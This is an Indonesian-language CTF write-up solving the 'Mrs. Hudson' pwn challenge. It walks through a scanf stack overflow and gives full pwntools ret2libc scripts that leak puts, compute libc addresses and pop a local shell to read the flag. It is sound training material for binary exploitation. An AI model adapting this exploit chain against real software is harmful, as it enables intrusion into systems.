---
title: "Writeup Asis Mrs. Hudson [pwn]"
date: 2021-02-07T00:38:53+07:00
tags: [writeups, rop, ret2libc, stack-overflow, 64bit]
categories: [binary exploitation]
comments: true
---
[klik disini](https://github.com/ahm4ddm/larebinex/blob/main/64/mrs._hudson/mrs._hudson) untuk download file.

Kita cek identitas dari file.
```
$file mrs._hudson
mrs._hudson: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a99b54f5a0f90ebade826e34188ac1f5eebb2cc7, not stripped
```
Didapatkan file ELF, 64bit, not stripped, dynamically linked.\
Selanjutnya kita cek proteksi pada file tersebut.
```
$checksec mrs._hudson
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
Kita lihat di GDB didapatkan:
```
gdb-peda$ pdisas main
Dump of assembler code for function main:
    ...
    ...
    ...
   0x000000000040066a <+80>:	call   0x400500 <puts@plt>
   0x000000000040066f <+85>:	lea    rax,[rbp-0x70]
   0x0000000000400673 <+89>:	mov    rsi,rax
   0x0000000000400676 <+92>:	mov    edi,0x40072b
   0x000000000040067b <+97>:	mov    eax,0x0
   0x0000000000400680 <+102>:	call   0x400520 <__isoc99_scanf@plt>
   0x0000000000400685 <+107>:	leave  
   0x0000000000400686 <+108>:	ret    
End of assembler dump.
```
Binary menggunakan ***scanf*** dimana memiliki kerentanan tidak ada pengecekan ukuran. \
Dengan begitu kita bisa mengoverflow buffer.

Selanjutnya kita menghitung offset
```
Registers contain pattern buffer:
RBP+0 found at offset: 112
Registers point to pattern buffer:
[RSP] --> offset 120 - size ~180
Pattern buffer found at:
0x00007fffffffdf50 : offset    0 - size  300 ($sp + -0x78 [-30 dwords])
References to pattern buffer found at:
0x00007fffffffdb58 : 0x00007fffffffdf50 ($sp + -0x470 [-284 dwords])
0x00007fffffffde88 : 0x00007fffffffdf50 ($sp + -0x140 [-80 dwords])
```
Didapatkan offset 120.

Untuk eksploitasi kita perlu mengoverflow buffer dan me-leak alamat ***puts***.\
Ingat bahwa binary merupakan dynamically linked dan pada saat kita debug binary dengan gdb menggunakan ***puts*** kita tau bahwa itu merupakan library c.\
Untuk leak, kita perlu alamat ***puts_plt*** dan ***puts_got*** menggunakan metode ***rop***. \
Ingat binary ini 64-bit dimana parameter disimpan pada [***RDI, RSI, RDX, RCX, R8, dan R9***](https://ctf101.org/binary-exploitation/what-are-calling-conventions/)

Untuk membuat rop chain memanggil ***puts*** kita menggunakan ***POP RDI RET*** untuk menyimpan nilai pada stack pada ***RDI***\
Kita buat script untuk me-leak alamat ***puts***
```
from pwn import *

p = ELF('./mrs._hudson')
rop = ROP(p)
r = process('./mrs._hudson')
r.recv()

popret = rop.find_gadget(['pop rdi', 'ret'])[0]
main = p.symbols['main']
putsplt = p.plt['puts']
putsgot = p.got['puts']
junk = b'X'*120
ropchain = b''
ropchain += p64(popret)
ropchain += p64(putsgot)
ropchain += p64(putsplt)
ropchain += p64(main)

r.sendline(junk + ropchain)
puts = u64(r.recv(0x6).ljust(8, b'\x00'))
log.info("PUTS 0x%x" %puts)
log.info("LEAK PLT 0x%x" %putsplt)
log.info("LEAK GOT 0x%x" %putsgot)
```
```
$python3 sol.py
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process './mrs._hudson': pid 24023
[*] PUTS 0x7f6152fa3590
[*] LEAK PLT 0x400500
[*] LEAK GOT 0x601018
```
Ohiya aku tambah ***main*** pada ropchain digunakan ketika sudah dapat alamat ***puts***, otomatis kita sudah bisa menghitung alamat ***libc base, system, /bin/sh, dan dsb*** setelah itu kembali ke fungsi main lagi terus kita lakukan ropchain untuk mengakses ***system /bin/sh***.

Setelah mendapatkan alamat ***puts***, kita download versi libc di [libcblukat](https://libc.blukat.me) sesuaikan dengan versi sistem operasi anda (mungkin berbeda dengan saya)

Untuk menghitung alamat ***libcbase, system, dan /bin/sh*** didapatkan:
```
from pwn import *

p = ELF('./mrs._hudson')
rop = ROP(p)
r = process('./mrs._hudson')
libc = ELF('libc6-amd64_2.31-6_i386.so')
r.recvline()

popret = rop.find_gadget(['pop rdi', 'ret'])[0]
main = p.symbols['main']
putsplt = p.plt['puts']
putsgot = p.got['puts']
junk = b'X'*120
ropchain = b''
ropchain += p64(popret)
ropchain += p64(putsgot)
ropchain += p64(putsplt)
ropchain += p64(main)

r.sendline(junk + ropchain)
puts = u64(r.recv(0x6).ljust(8, b'\x00'))
r.recvline()
libcbase = puts - libc.symbols['puts']
system = libcbase + libc.symbols['system']
binsh = libcbase + next(libc.search(b'/bin/sh\x00'))

log.info("LEAK PLT 0x%x" %putsplt)
log.info("LEAK GOT 0x%x" %putsgot)
log.info("LEAK PUTS 0x%x" %puts)
log.info("LIBC BASE 0x%x" %libcbase)
log.info("SYSTEM 0x%x" %system)
log,info("/BIN/SH 0x%x" %binsh)
```
```
$python3 sol.py
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[*] Loaded 14 cached gadgets for './mrs._hudson'
[+] Starting local process './mrs._hudson': pid 69164
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] LEAK PLT 0x400500
[*] LEAK GOT 0x601018
[*] LEAK PUTS 0x7f4dc7fd1590
[*] LIBC BASE 0x7f4dc7f5b000
[*] SYSTEM 0x7f4dc7fa3df0
[*] /BIN/SH 0x7f4dc80e5156
```
Lalu kita buat ropchain untuk mengakses ***system /bin/sh***\
atau [klik disini](https://github.com/ahm4ddm/larebinex/blob/main/64/Mrs.Hudson/sol.py) untuk kode exploit 
```
from pwn import *

p = ELF('./mrs._hudson')
rop = ROP(p)
r = process('./mrs._hudson')
libc = ELF('libc6-amd64_2.31-6_i386.so')
r.recvline()

popret = rop.find_gadget(['pop rdi', 'ret'])[0]
main = p.symbols['main']
putsplt = p.plt['puts']
putsgot = p.got['puts']
junk = b'X'*120
ropchain = b''
ropchain += p64(popret)
ropchain += p64(putsgot)
ropchain += p64(putsplt)
ropchain += p64(main)

r.sendline(junk + ropchain)
puts = u64(r.recv(0x6).ljust(8, b'\x00'))
libcbase = puts - libc.symbols['puts']
system = libcbase + libc.symbols['system']
binsh = libcbase + next(libc.search(b'/bin/sh\x00'))
r.recvline()
log.info("LEAK PLT 0x%x" %putsplt)
log.info("LEAK GOT 0x%x" %putsgot)
log.info("LEAK PUTS 0x%x" %puts)
log.info("LIBC BASE 0x%x" %libcbase)
log.info("SYSTEM 0x%x" %system)
log,info("/BIN/SH 0x%x" %binsh)

r.sendline(junk + p64(popret) + p64(binsh) + p64(system))
r.interactive()
```
```
$python3 sol.py
...
...
...
[*] LEAK PLT 0x400500
[*] LEAK GOT 0x601018
[*] LEAK PUTS 0x7f8172a41590
[*] LIBC BASE 0x7f81729cb000
[*] SYSTEM 0x7f8172a13df0
[*] /BIN/SH 0x7f8172b55156
[*] Switching to interactive mode
Let's go back to 2000.
$ cat flag.txt
ctf{sukses}$  
```

### Catatan
Writeup diatas hanya sebagai latihan.\
Siapa tahu bermanfaat bagi Anda yang sekarang sedang mempelajari Binary Exploitation. 
